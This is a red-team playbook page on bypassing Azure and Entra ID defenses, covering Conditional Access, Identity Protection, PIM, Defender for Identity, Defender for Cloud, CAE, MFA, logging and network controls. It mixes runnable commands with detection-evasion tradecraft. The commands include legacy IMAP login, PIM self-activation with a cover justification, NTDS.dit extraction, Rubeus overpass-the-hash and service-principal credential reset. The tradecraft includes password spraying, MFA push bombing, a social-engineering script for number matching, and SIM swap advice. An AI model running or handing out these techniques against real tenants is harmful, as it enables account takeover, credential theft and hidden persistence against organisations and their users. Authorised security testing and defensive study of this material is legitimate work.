# Azure Defenses & Bypass

> **MITRE ATT&CK**: Defense Evasion > T1562 (Impair Defenses), T1550 (Use Alternate Authentication Material)
> **Platforms**: Azure / Entra ID / Microsoft 365
> **Required Privileges**: Low to High (varies by bypass technique)
> **OPSEC Risk**: Medium-High

## Strategic Overview

Azure's defense stack is layered: Conditional Access policies control who can authenticate, Identity Protection scores risk, PIM gates privilege activation, MDI watches on-premises identity traffic, Defender for Cloud monitors resource posture, and CAE attempts real-time token revocation. A red team lead must understand that these defenses are not independent walls but an interconnected mesh -- and every mesh has gaps at the seams. The most productive bypass paths exploit architectural assumptions: CA policies that exclude service principals, Identity Protection that trusts "compliant" devices, PIM approvals that can be pre-staged, and CAE that only covers specific resources. The critical insight is that Microsoft designed each defense layer with specific threat models, and attacks outside those models often pass through undetected. Legacy protocols, workload identities, cross-tenant tokens, and management plane operations are consistently under-monitored compared to interactive user sign-ins. Understanding both the defense mechanism and its design boundaries is what separates effective red team operations from noisy testing.

## Technical Deep-Dive

### Conditional Access Policy Bypass

```powershell
# Step 1: Enumerate CA policies to find gaps (see azure-enumeration.md)
$headers = @{Authorization = "Bearer $accessToken"}
$policies = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" -Headers $headers).value

# Common CA policy gaps to target:

# Gap 1: Legacy Authentication Protocols
# If CA policy does not explicitly block legacy auth:
# IMAP, POP3, SMTP, and ActiveSync do NOT support MFA
# These bypass any MFA-requiring CA policy
python3 -c "
import imaplib
m = imaplib.IMAP4_SSL('outlook.office365.com')
m.login('user@target.com', 'password')
m.select('INBOX')
typ, data = m.search(None, 'ALL')
print(f'Messages: {len(data[0].split())}')
"
# Note: Microsoft disabled Basic Auth for Exchange Online protocols in 2023
# But some tenants have re-enabled it for specific apps or have exceptions

# Gap 2: Break-Glass Account Exclusions
# Nearly all tenants exclude emergency access accounts from CA policies
# If you identify the break-glass accounts (see enumeration):
$policies | ForEach-Object {
    $excluded = $_.conditions.users.excludeUsers
    if ($excluded) { Write-Output "$($_.displayName): excludes $($excluded -join ', ')" }
}
# Break-glass accounts often have static passwords, no MFA, and Global Admin

# Gap 3: Application Exclusions
# Some apps are excluded from CA because they "don't support modern auth"
$policies | ForEach-Object {
    $excludedApps = $_.conditions.applications.excludeApplications
    if ($excludedApps) { Write-Output "$($_.displayName): excludes apps $($excludedApps -join ', ')" }
}
# Authenticate via an excluded app to bypass policy

# Gap 4: Trusted Location Abuse
# CA policies often skip MFA for "trusted locations" (corporate IP ranges)
# If you can route through the corporate VPN/proxy:
$locations = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations" -Headers $headers).value
$locations | ForEach-Object {
    Write-Output "$($_.displayName): $($_.ipRanges.cidrAddress -join ', ')"
}
# Use a SOCKS proxy through a compromised internal host to appear trusted

# Gap 5: Device Compliance Spoofing
# CA policies requiring "compliant device" trust Intune's compliance state
# If you compromise an Intune-enrolled device, you inherit its compliance
# PRT from a compliant device satisfies device-based CA policies

# Gap 6: Token Lifetime Exploitation
# Default access token lifetime: 60-90 minutes
# Tokens acquired BEFORE a CA policy change remain valid until expiry
# Refresh tokens: up to 90 days (can be revoked but often aren't)
# Race condition: acquire tokens, then CA policy changes don't affect existing tokens

# Gap 7: Report-Only Policies
# Policies in "report-only" mode log but don't enforce
$policies | Where-Object { $_.state -eq "enabledForReportingButNotEnforced" } |
    Select-Object displayName
# These policies reveal intended security posture without blocking access
```

### Entra ID Identity Protection Bypass

```powershell
# Identity Protection uses ML-based risk scoring:
# - Sign-in risk: anonymous IP, impossible travel, malware-linked IP, unfamiliar properties
# - User risk: leaked credentials, anomalous behavior patterns

# Bypass 1: Known-Good IP Addresses
# Sign from the organization's known IP ranges
# Use compromised VPN, proxy, or cloud infrastructure in expected locations
# Identity Protection trusts traffic from recognized corporate IPs

# Bypass 2: Gradual Behavior Normalization
# Don't immediately access all resources after compromise
# Build a "normal" pattern over days before escalating
# - Day 1: Sign in, read email
# - Day 2: Access SharePoint, Teams
# - Day 3: Access Azure Portal, list resources
# - Day 4+: Targeted exploitation
# This avoids "unfamiliar sign-in properties" risk detection

# Bypass 3: Compliant Device Context
# Sign in from the compromised user's actual device
# PRT + device compliance + familiar network = lowest risk score
# Identity Protection heavily weights device trust signals

# Bypass 4: Anonymous Proxy Detection Evasion
# Avoid known proxy/VPN IP addresses in Microsoft's threat intelligence
# Use residential proxies or cloud provider IPs not flagged as proxies
# Azure-to-Azure traffic from the same region is least suspicious

# Bypass 5: Impossible Travel Avoidance
# Maintain consistent geographic presence
# If moving between locations, allow sufficient time (calculate based on distance)
# Or: use the victim's device/VPN to maintain consistent IP geography

# Enumerate current risk detections (requires SecurityReader or higher)
$headers = @{Authorization = "Bearer $accessToken"}
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/identityProtection/riskDetections?\`$top=20&\`$orderby=activityDateTime desc" -Headers $headers

# Check a specific user's risk level
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/identityProtection/riskyUsers?\`$filter=userPrincipalName eq 'user@target.com'" -Headers $headers
```

### Privileged Identity Management (PIM) Bypass

```powershell
# PIM enforces just-in-time activation for privileged roles
# Operators can only use roles after explicitly "activating" them

# Technique 1: Pre-Activated Role Abuse
# Some roles may be permanently assigned (not PIM-eligible)
# Enumerate active vs eligible assignments:
$headers = @{Authorization = "Bearer $accessToken"}

# Active (permanently assigned) role assignments
$active = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" -Headers $headers
# These don't require PIM activation

# Eligible (require activation) assignments
$eligible = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleInstances" -Headers $headers

# Technique 2: PIM Activation with Weak Justification
# If the PIM policy only requires a justification (no approval):
$body = @{
    principalId = "USER_OBJECT_ID"
    roleDefinitionId = "ROLE_DEFINITION_ID"
    directoryScopeId = "/"
    action = "selfActivate"
    justification = "Routine security review and compliance check"
    scheduleInfo = @{
        startDateTime = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
        expiration = @{
            type = "afterDuration"
            duration = "PT8H"
        }
    }
} | ConvertTo-Json -Depth 5

Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests" `
  -Method POST -Headers $headers -Body $body -ContentType "application/json"

# Technique 3: PIM Policy Weaknesses
# Check PIM role settings for each role:
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/policies/roleManagementPolicyAssignments?\`$filter=scopeId eq '/' and scopeType eq 'DirectoryRole'" -Headers $headers
# Look for:
# - Roles with no approval required (self-service activation)
# - Long maximum activation duration (8-24 hours)
# - No MFA required for activation
# - No ticket/justification required

# Technique 4: Timing Attacks
# PIM activation events are logged but may not be real-time alerted
# Activate during high-activity periods (deployment windows, business hours)
# Deactivate as soon as the privileged action is complete
```

### Microsoft Defender for Identity (MDI) Evasion

```powershell
# MDI sensors on DCs detect: DCSync, PtH, brute force, lateral movement, recon
# Understanding what MDI detects is key to evading it

# Evasion 1: DCSync Detection Bypass
# MDI detects DCSync by monitoring DRS replication requests from non-DC sources
# Mitigation: use the compromised DC itself, or pre-position on a DC
# Alternative: use NTDS.dit extraction (Volume Shadow Copy) instead of DCSync
ntdsutil "ac i ntds" "ifm" "create full c:\temp\ifm" q q
# Then parse offline -- no DRS replication traffic for MDI to detect

# Evasion 2: Pass-the-Hash Alert Avoidance
# MDI detects PtH by correlating authentication type with account behavior
# Use Kerberos (overpass-the-hash) instead of NTLM PtH:
Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt
# Kerberos ticket requests are harder for MDI to flag as anomalous

# Evasion 3: Brute Force Detection Bypass
# MDI flags rapid authentication failures from a single source
# Use slow-spray: 1-2 passwords per account, with 30+ minute intervals
# Distribute across multiple source IPs
# Target a small set of accounts to stay below threshold

# Evasion 4: Reconnaissance Detection Bypass
# MDI detects LDAP/SAM-R enumeration patterns
# Use the Graph API or Azure-native tools instead of on-prem LDAP queries
# ROADrecon, AzureHound, and GraphRunner enumerate via cloud APIs
# This bypasses MDI entirely since sensors are only on DCs

# Evasion 5: Lateral Movement Path Alert Avoidance
# MDI builds lateral movement path graphs
# Avoid connecting to multiple systems in rapid succession
# Use non-standard lateral movement (WMI, scheduled tasks) over PsExec/SMB
# Cloud-based lateral movement (Intune, Runbooks) is invisible to MDI
```

### Microsoft Defender for Cloud Bypass

```bash
# Defender for Cloud provides CSPM (posture) and CWP (workload protection)
# It generates recommendations and security score alerts

# Bypass 1: Suppression Rules
# Admins can suppress recommendations -- check for over-suppressed alerts
az security alert list --query "[?status=='Dismissed']" -o table

# Bypass 2: Policy Exemptions
# Azure Policy exemptions exclude specific resources from compliance
az policy exemption list --query "[].{Name:name,Category:exemptionCategory,Scope:scope}" -o table
# Resources with exemptions may have known security gaps

# Bypass 3: Disabling Auto-Provisioning
# If you have sufficient permissions, disable Defender agents
# This removes workload protection without immediate alerting (may take hours)
# Note: This is a destructive action -- only for authorized testing

# Bypass 4: Operating Below Recommendation Thresholds
# Defender for Cloud scores are aggregate -- individual low-severity items
# may not trigger alerts
# Focus on actions that generate low/medium severity findings rather than high

# Bypass 5: Using Exempt Resource Types
# Not all Azure resource types have Defender coverage
# Logic Apps, API Management, and some PaaS services have limited monitoring
# Pivot through less-monitored services when possible

# Enumerate Defender for Cloud status
az security pricing list --query "[].{Name:name,Tier:pricingTier}" -o table
# "Free" tier = minimal protection; "Standard" = full Defender coverage
# Resources on Free tier have significantly less monitoring
```

### Continuous Access Evaluation (CAE) Bypass

```powershell
# CAE enables near-real-time token revocation for critical events:
# - User disabled/deleted
# - Password changed
# - MFA re-registration
# - Admin explicitly revokes tokens
# - Location-based policy violation (IP changes)

# CAE-Aware vs CAE-Unaware Resources
# CAE is NOT universal -- only specific resources support it:
# Supported: Exchange Online, SharePoint Online, Teams, Graph API
# NOT supported: Many third-party apps, Azure Management API (partially),
#                custom applications, legacy protocols

# Bypass 1: Target CAE-Unaware Resources
# Stolen tokens for non-CAE resources remain valid for full lifetime
# Use tokens against Azure Resource Manager or non-CAE-enabled APIs
# These tokens won't be revoked even if the user's password is changed

# Bypass 2: Token Caching Exploitation
# Some applications cache tokens locally and don't check CAE signals
# Desktop applications, thick clients, and mobile apps may use cached tokens
# Even after server-side revocation, cached tokens may work briefly

# Bypass 3: Non-CAE Client Usage
# Use OAuth clients that don't implement CAE:
# - Legacy OAuth libraries
# - Custom scripts using raw HTTP
# - Tools that don't handle CAE challenge responses (claims challenges)
$headers = @{Authorization = "Bearer $stolenToken"}
# Direct API calls don't send CAE capabilities header
# Server may not enforce CAE for clients that don't advertise support

# Bypass 4: Critical Event Timing
# CAE enforcement has a propagation delay (typically 1-5 minutes)
# After compromise, operate quickly before revocation propagates
# Extract tokens, establish persistence, and exfiltrate data rapidly

# Check if a token is CAE-enabled
# Decode the JWT and look for the "xms_cc" claim
$tokenParts = $accessToken.Split('.')
$payload = [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String($tokenParts[1] + '=='))
$claims = $payload | ConvertFrom-Json
if ($claims.xms_cc -contains "cp1") {
    Write-Output "CAE-enabled token -- subject to real-time revocation"
} else {
    Write-Output "Non-CAE token -- valid until natural expiry"
}
```

### MFA Bypass Techniques

```powershell
# MFA Fatigue / Push Bombing
# Repeatedly trigger MFA push notifications until victim approves
# Effectiveness reduced since Microsoft added number matching (Feb 2023)
# But still works against organizations with:
# - SMS/phone call MFA (no number matching)
# - Third-party MFA apps without number matching
# - Users who tap "Approve" without reading

# Token Theft (Post-MFA)
# The most reliable MFA bypass: steal tokens AFTER MFA is completed
# AiTM phishing proxies (Evilginx2, EvilNoVNC, Modlishka)
# capture the session cookie/token after victim completes MFA
# See: azure-initial-access.md for AiTM techniques

# FIDO2 Downgrade Attack
# If the target uses FIDO2 keys but the tenant also allows weaker methods:
# Force authentication through a flow that doesn't support FIDO2
# Fall back to SMS, phone call, or authenticator app
# Works when: multiple MFA methods registered, weakest one exploitable

# Number Matching Social Engineering
# For Microsoft Authenticator with number matching:
# AiTM proxy captures the number displayed during sign-in
# Relay the number to the victim via a parallel communication channel
# "Your IT department is testing login -- please enter 47 in the prompt"

# Legacy Protocol Bypass (if not blocked by CA)
# IMAP/POP/SMTP/EWS Basic Auth bypass MFA entirely
# Check if legacy auth is blocked in CA policies before attempting

# Device Code Phishing (inherent MFA bypass)
# Device code flow authenticates on a different device
# Victim completes MFA on their device, attacker gets the token
# See: azure-ad-attacks.md for device code phishing details

# SIM Swap / SS7 Interception (for SMS-based MFA)
# SIM swap: social engineer mobile carrier to port victim's number
# SS7: intercept SMS via telecom protocol vulnerabilities
# Both are expensive and leave traces -- use only when justified
```

### Logging & Monitoring Evasion

```powershell
# Azure logging landscape:
# - Entra ID Sign-in Logs (all authentications)
# - Entra ID Audit Logs (directory changes)
# - Azure Activity Log (resource operations)
# - Diagnostic Settings (per-resource detailed logs)
# - Microsoft 365 Unified Audit Log (M365 operations)

# Evasion 1: Graph API-Only Operations
# Many Graph API read operations generate minimal audit log entries
# Reading users, groups, policies via Graph creates sign-in log entry
# but individual read operations are not itemized in audit logs
# Bulk enumeration appears as a single authenticated session

# Evasion 2: Workload Identity vs User Identity Gaps
# Service principal sign-ins are logged in a SEPARATE log stream
# (workload identity sign-in logs) that many SOCs don't monitor
# Compromise an SP and operate as a workload identity for reduced visibility
az ad sp credential reset --id SP_APP_ID --years 1
# Authenticate as SP:
az login --service-principal -u APP_ID -p SECRET --tenant TENANT_ID

# Evasion 3: Reducing Log Footprint
# Use $select to request only needed properties (less data in logs)
# Use single Resource Graph queries instead of multiple ARM calls
# Avoid enumeration patterns: don't list all of a resource type sequentially
# Use existing Managed Identity tokens (MI auth doesn't generate new sign-in)

# Evasion 4: Avoiding Sign-in Anomaly Detection
# Match expected patterns:
# - Sign in during business hours
# - From expected geographic locations
# - Using expected client applications (Azure Portal, Az CLI)
# - With expected User-Agent strings
$headers = @{
    Authorization = "Bearer $token"
    "User-Agent"  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

# Evasion 5: Blind Spots in Azure Logging
# - Azure AD Graph API operations (legacy, being deprecated but still functional)
# - Some Azure Resource Manager operations in Free-tier subscriptions
# - Logic App execution details (unless diagnostic settings configured)
# - Function App invocation payloads (only execution count by default)
# - Resource Graph query content (only that a query occurred)
# - Cross-tenant B2B operations (logged in guest tenant, may not be in home)

# Evasion 6: Log Retention Gaps
# Default log retention:
# - Sign-in logs: 30 days (P1/P2 license) or 7 days (free)
# - Audit logs: 30 days (P1/P2) or 7 days (free)
# - Activity logs: 90 days
# - If SIEM export not configured, old logs are lost
# Operating in a tenant with short retention = less forensic exposure
```

### Network Security Bypass

```bash
# NSG (Network Security Group) Bypass
# NSGs filter traffic at the subnet or NIC level
# Bypass via Azure-internal traffic:
# - Traffic between resources in the same VNet bypasses NSG if no intra-VNet rules
# - Azure platform traffic (168.63.129.16, 169.254.169.254) bypasses NSG rules
# - Service Tags (AzureCloud, AzureLoadBalancer) may allow broader access than intended

# Private Endpoint Exploitation
# Private Endpoints bring PaaS services into the VNet
# If you're on a VM in the same VNet, you can access Private Endpoint resources
# that are otherwise firewalled from the public internet
# This includes: Key Vaults, Storage Accounts, SQL, CosmosDB with PE configured
nslookup targetvault.vault.azure.net
# Returns private IP (10.x.x.x) if PE is configured and you're in the VNet

# Service Endpoint Abuse
# Service Endpoints route traffic to PaaS services via Azure backbone
# Resources with service endpoints may trust "all Azure traffic"
# From any Azure VM, traffic appears to come from the Azure backbone
az storage account show --name targetstore --query "networkRuleSet"
# If defaultAction is "Deny" but virtualNetworkRules include broad subnets

# Azure Firewall Evasion
# Azure Firewall uses FQDN rules -- domain-fronting may bypass
# If *.azurewebsites.net is allowed, any Azure App Service is reachable
# Azure Firewall doesn't inspect TLS by default (SNI-only filtering)
# Tunneling C2 through allowed Azure services bypasses FQDN filtering

# Azure Bastion Bypass
# If Bastion is the only allowed RDP/SSH path, but you have:
# - Run Command (via ARM API): az vm run-command invoke
# - Custom Script Extension: push scripts without RDP
# - Serial Console: direct console access via Azure Portal
# - Managed Identity + SSH extension: SSH via Entra ID authentication
```

## Detection & Evasion Summary

| Defense Layer | Key Detection | Primary Bypass | OPSEC Notes |
|--------------|--------------|----------------|-------------|
| Conditional Access | Sign-in logs with CA evaluation | Legacy auth, excluded apps/users, trusted IPs | Report-only policies are gold mines |
| Identity Protection | Risk detections, risky sign-ins | Familiar device/IP, gradual normalization | Avoid anonymous proxies and impossible travel |
| PIM | Role activation events | Permanently assigned roles, weak policies | Activate during change windows |
| MDI | DRS replication, auth anomalies | Cloud-native enumeration, Kerberos over NTLM | Sensors only cover DCs |
| Defender for Cloud | Security recommendations, alerts | Exempt resources, Free-tier gaps | Policy exemptions reveal known gaps |
| CAE | Token revocation signals | Non-CAE resources, cached tokens | Check xms_cc claim in JWT |
| MFA | MFA challenge logs | AiTM token theft, device code phishing | Post-MFA tokens are most reliable |
| Azure Logging | Sign-in, audit, activity logs | SP identities, Graph reads, MI tokens | Workload identity logs often unmonitored |
| Network Security | NSG flow logs, Firewall logs | Service Tags, Private Endpoints, ARM API | Azure-internal traffic less scrutinized |

## Cross-References

- [Azure Enumeration](azure-enumeration.md) -- CA policy and defense posture enumeration
- [Azure AD / Entra ID Attacks](azure-ad-attacks.md) -- PRT abuse, token manipulation, CA bypass techniques
- [Azure Initial Access](azure-initial-access.md) -- AiTM phishing, device code flow for MFA bypass
- [Azure Privilege Escalation](azure-privilege-escalation.md) -- PIM bypass for privilege escalation
- [Azure Data Mining](azure-data-mining.md) -- Data extraction after defense bypass
- [Azure Persistence](azure-persistence.md) -- Maintaining access through defense layers
- [Entra ID Token Security](entra-id-token-security.md) -- Token-level mechanics of CA/CAE/Token Protection bypasses, revocation timing
- [Cloud Lateral Movement](../../09-lateral-movement/cloud-lateral.md) -- Network security bypass for lateral movement
- [AV/EDR Evasion](../../06-defense-evasion/av-edr-evasion.md) -- Endpoint defense evasion parallels
- [ETW Evasion](../../06-defense-evasion/etw-evasion.md) -- On-premises monitoring evasion context

## References

- https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview
- https://learn.microsoft.com/en-us/entra/id-protection/overview-identity-protection
- https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-configure
- https://learn.microsoft.com/en-us/defender-for-identity/what-is
- https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-cloud-introduction
- https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-continuous-access-evaluation
- https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/
- https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse
- https://github.com/dafthack/GraphRunner
- https://www.inversecos.com/2022/07/hunting-for-azure-conditional-access.html
- https://aadinternals.com/
